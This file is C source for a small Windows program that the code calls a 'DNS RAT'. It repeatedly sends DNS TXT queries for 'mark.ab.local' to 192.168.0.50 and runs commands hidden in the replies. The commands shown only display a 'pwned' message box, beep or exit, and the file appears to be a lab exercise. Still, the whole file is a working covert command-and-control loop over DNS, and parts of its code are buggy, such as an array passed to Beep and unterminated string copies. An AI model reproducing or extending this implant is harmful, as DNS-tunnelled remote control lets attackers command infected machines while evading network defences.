#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>
#include <windows.h>
#include <conio.h>

#pragma comment(lib, "ws2_32")

#define BUFLEN 65536

// DNS STANDARD QUERY PACKET
struct dns_header
{
    unsigned short id; // identification number

    unsigned char rd :1; // recursion desired
    unsigned char tc :1; // truncated message
    unsigned char aa :1; // authoritive answer
    unsigned char opcode :4; // purpose of message
    unsigned char qr :1; // query/response flag

    unsigned char rcode :4; // response code
    unsigned char cd :1; // checking disabled
    unsigned char ad :1; // authenticated data
    unsigned char z :1; // its z! reserved
    unsigned char ra :1; // recursion available

    unsigned short q_count; // number of question entries
    unsigned short ans_count; // number of answer entries
    unsigned short auth_count; // number of authority entries
    unsigned short add_count; // number of resource entries
};

struct question{
    unsigned short type;
    unsigned short tclass;
};

typedef struct
{
    unsigned char *name;
    struct question *ques;
} query;


void ChangetoDnsNameFormat(unsigned char* dns,unsigned char* host){
    int lock = 0 , i;
    strcat((char*)host,".");

    for(i = 0 ; i < strlen((char*)host) ; i++)
    {
        if(host[i]=='.')
        {
            *dns++ = i-lock;
            for(;lock<i;lock++)
            {
                *dns++=host[lock];
            }
            lock++; //or lock=i+1;
        }
    }
    *dns++='\0';
}

void processCommand(char buf[]){

    char c = buf[0];

    if(c == '1'){
        char msg[strlen(buf)-2];
        strncpy(msg, buf+2,strlen(buf)-2);
        int msgboxID = MessageBox(
        NULL,
        msg,
        "pwned",
        MB_ICONWARNING
        );
    }
    else if(c == '2'){
        int i = 0;
        char beep[strlen(buf)-2];
        strncpy(beep, buf+2,strlen(buf)-2);
        sscanf(beep, "%d", &i);
        Beep(beep,900);
        sleep(5);
    }
    else if(c == '3'){
        exit(0);
    }
    else{
        sleep(10);
    }

}

int main()
{
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2,2),&wsa) != 0){
            printf("Failed. Error Code : %d",WSAGetLastError());
            return 1;
    }

    int i = 0;

    // WINSOCK INITIALIZATION
    SOCKET sock;
    SOCKADDR_IN ReceiverAddr , SrcInfo;
    SOCKADDR_IN SenderAddr;
    int slen = sizeof(ReceiverAddr) ;
    int port = 53;

    printf("1 - WINSOCK INITIALIZED. \n");

    if((sock = socket(AF_INET , SOCK_DGRAM, IPPROTO_UDP )) == INVALID_SOCKET){
        printf("Could not create socket : %d" , WSAGetLastError());
    }
    printf("2 - WINSOCK SOCKET CREATED. \n");
    ReceiverAddr.sin_family = AF_INET;
    ReceiverAddr.sin_port = htons(port);
    ReceiverAddr.sin_addr.s_addr = inet_addr("192.168.0.50");

    while(1==1){
        printf("Going for round: %d \n",i);
        unsigned char buf[65536],*qname,*reader;
        char host[100]; // DNS QUERY

        printf("DNS RAT UP AND RUNNING \n");

        // ------ DNS QUERY CRAFTING
        strcpy(host, "mark.ab.local");

        struct question *qinfo = NULL;
        struct dns_header *dns = NULL;

        // DNS QUERY HEADERS SETUP
        dns = (struct dns_header *)&buf;
        dns->id = (unsigned short) htons(getpid());
        dns->qr = 0; //This is a query
        dns->opcode = 0; //This is a standard query
        dns->aa = 0; //Not Authoritative
        dns->tc = 0; //This message is not truncated
        dns->rd = 1; //Recursion Desired
        dns->ra = 0; //Recursion not available! hey we dont have it (lol)
        dns->z = 0;
        dns->ad = 0;
        dns->cd = 0;
        dns->rcode = 0;
        dns->q_count = htons(1); //we have only 1 question
        dns->ans_count = 0;
        dns->auth_count = 0;
        dns->add_count = 0;

        // DNS QUESTION
        qname =(unsigned char*)&buf[sizeof(struct dns_header)];
        ChangetoDnsNameFormat(qname , host); // SUBSTITUTE '.' BY LENGTH
        // UPDATE THE QUERY BUFFER
        qinfo =(struct question*)&buf[sizeof(struct dns_header) + (strlen((const char*)qname) + 1)];
        // SET CLASS
        qinfo->type = htons(16); // 1 == 'A', 16 == 'TXT', we ask for TXT registers
        qinfo->tclass = htons(1); // 1 = INTERNET

        // ------ END OF DNS QUERY MAGIC

        if (sendto(sock,(char*)buf,sizeof(struct dns_header) + (strlen((const char*)qname)+1) + sizeof(struct question) , 0 , (struct SOCKADDR *) &ReceiverAddr, slen) == SOCKET_ERROR){
            printf("sendto() failed with error code : %d ", WSAGetLastError());
            exit(EXIT_FAILURE);
        }
        else{
            printf("3 - SENDTO() OK, packet sent\n");
        }

        if (recvfrom(sock, &buf, BUFLEN, 0,0,0) == SOCKET_ERROR){
            printf("error recving : %d" , WSAGetLastError());

        }else{
            printf("4 - RECVFROM() OK, packet received \n"); // joe.ab.local
            reader = &buf[sizeof(struct dns_header) + (strlen((const char*)qname)+1) + sizeof(struct question)];

            if(dns->ans_count > 0){
                int txt_position = 30 + strlen(host)-1;
                int txt_response_len = buf[txt_position];
                char command[txt_response_len];
                strncpy(command,buf + txt_position+1, txt_response_len);
                processCommand(command);
            }
        }

        i +=1;
    }
    WSACleanup();
    printf("WSACLEANUP() OK exiting \n");
    return 0;
}
